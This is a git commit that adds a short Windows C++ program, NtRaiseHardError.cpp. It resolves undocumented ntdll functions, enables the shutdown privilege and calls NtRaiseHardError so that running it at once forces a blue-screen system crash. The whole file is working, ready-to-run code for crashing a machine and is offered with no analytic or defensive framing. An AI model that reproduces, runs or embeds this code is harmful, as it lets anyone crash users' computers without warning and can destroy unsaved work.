291fc027b7af57be294c8a7f6adaaa8efec17331
Agniva <73333593+AgnivaMaity@users.noreply.github.com>
2021-12-15 08:21:35 +0530

    Update NtRaiseHardError.cpp

--- NtRaiseHardError.cpp
+++ NtRaiseHardError.cpp
@@ -1,1 +1,35 @@
+#include <Windows.h>
+#include <winternl.h>
 
+typedef NTSTATUS
+(NTAPI* pdef_RtlAdjustPrivilege)
+(ULONG Privilege,
+    BOOLEAN Enable,
+    BOOLEAN CurrentThread,
+    PBOOLEAN Enabled);
+typedef NTSTATUS
+(NTAPI* pdef_NtRaiseHardError)
+(NTSTATUS ErrorStatus,
+    ULONG NumberOfParameters,
+    ULONG UnicodeStringParameterMask OPTIONAL,
+    PULONG_PTR Parameters,
+    ULONG ResponseOption,
+    PULONG Response);
+
+void TriggerHardBsod()
+{
+    BOOLEAN bEnabled;
+    ULONG uResp;
+    LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
+    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
+    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;
+    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
+    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
+}
+
+int main()
+{
+    TriggerHardBsod();
+    ExitProcess(1);
+}
